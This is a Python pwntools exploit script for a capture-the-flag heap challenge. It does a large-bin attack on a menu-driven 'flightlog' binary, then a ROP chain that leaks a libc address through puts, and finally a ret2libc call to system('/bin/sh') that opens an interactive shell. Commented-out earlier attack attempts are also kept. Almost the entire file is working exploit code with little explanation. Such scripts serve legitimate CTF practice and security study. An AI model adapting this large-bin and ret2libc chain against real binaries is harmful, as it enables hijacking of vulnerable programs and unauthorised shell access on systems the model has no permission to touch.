#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chal.competitivecyber.club"
PORT = 8885

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    sl(p, b"2")
    ru(p,b"flightlog >> ")
    sl(p,b"%i" % size)
    ru(p,b"flightscript >> ")
    sl(p, value)
    sl(p, b"")
    ru(p, b">>")

def edit(p, index, value):
    sl(p,b"3")
    ru(p, b"index >>")
    sl(p,"%i" % index)
    ru(p,b"(8) >>")
    sl(p,value)
    ru(p, b">>")

def delete(p, index):
    sl(p, b"4")
    sl(p,"%i" % index)
    ru(p, b">>")

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)
    

def exploit(io,e,l):
    # restarting now that I know that this is just a large bins attack
    # why didn't I think of this????

    # create initial chunks
    create(io, 0x428, b"A") # 0
    create(io, 0x28, b"A") # 1 this chunk stops consolidation
    create(io, 0x418, b"A") # 2

    # sort to the large bins
    delete(io, 0)
    create(io, 0x438, b"A") # 3

    # large bins attack
    edit(io, 0, p64(e.symbols["loglen"] - 0x20))
    delete(io, 2)
    create(io, 0x438, b"A") # 4
    
    # now we ROP
    # find a libc leak
    payload = b"A" * 0x118
    payload += p64(0x4011dc) # pop rdi ; ret
    payload += p64(e.sym.got["puts"])
    payload += p64(e.sym.plt["puts"])
    payload += p64(e.sym.main)

    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b">>", payload)
    io.sendlineafter(b">>", b"5") # exit

    io.recvuntil(b"day!\n")
    leak = io.recvline()
    leak = int.from_bytes(leak[:-1], "little")
    leak = leak - l.sym.puts

    info(f"Libc leak: {hex(leak)}")

    # ret2libc
    binsh = next(l.search("/bin/sh")) + leak
    system = l.sym.system + leak
    ret = 0x40101a

    payload = b"A" * 0x118 + p64(0x4011dc) + p64(binsh) + p64(ret) + p64(system)
    
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b">>", payload)
    io.sendlineafter(b">>", b"5") # exit

    '''
    # create initial chunks
    create(io, 0x18, p64(0x20d71)) # 0
    create(io, 0x438, b"A") # 1 a
    create(io, 0x418, b"A") # 2 (target chunk)
    create(io, 0x28, b"A") # 3

    # free to unsorted bins and change size
    edit(io, 0, p64(0x861)) # a
    delete(io, 1)

    create(io, 0x428, b"A") # 1 a
    create(io, 0x28, b"BBBBBBBB") # 4
    
    # this edits target chunk's bk
    edit(io, 4, b"AAAA")

    # change back target chunk's size field so it works
    edit(io, 0, p64(0x461)) # a
    #delete(io, 1)
    create(io, 0x418, b"A") # 5 a
    delete(io, 1)
    create(io, 0x418, b"BBBBBBBB") # 1 a
    create(io, 0x18, p64(0x421)) # 6

    # edit bk
    edit(io, 5, p64(0x4040f0))
    #edit(io, 5, p64(0x4040e0))

    delete(io, 3)
    create(io, 0x418, b"AAAA")
    '''

    '''
    # fill tcachebins
    cur = 0x420
    create(io, cur, b"A")
    create(io, cur, b"A")
    for i in range(7):
        create(io, cur, b"A")

        delete(io, i)
    '''
    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("/usr/lib/libc.so.6")

    exploit(p,e,l)
